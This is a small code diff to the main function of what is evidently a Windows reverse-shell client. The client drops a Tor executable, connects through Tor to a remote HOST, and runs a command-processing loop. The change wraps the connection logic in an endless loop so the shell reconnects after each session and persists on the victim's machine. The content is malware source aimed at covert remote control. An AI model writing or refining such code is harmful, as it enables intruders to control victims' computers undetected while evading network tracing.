@@ -33,15 +33,16 @@ int main() {
         dropTor();
     }
     
-    torRevShellClient c(".\\tor.exe", HOST);
-    bool conn = c.attemptConnect();
-    while (!conn) {
-        printf("Connection failed... Retrying in 10 seconds\n");
-        Sleep(10000);
-        conn = c.attemptConnect();
+    while (1) {
+        torRevShellClient c(".\\tor.exe", HOST);
+        bool conn = c.attemptConnect();
+        while (!conn) {
+            printf("Connection failed... Retrying in 10 seconds\n");
+            Sleep(10000);
+            conn = c.attemptConnect();
+        }
+        c.cmdProcessLoop();
     }
-
-    c.cmdProcessLoop(); // Will run forever
 
     return 0;
 }
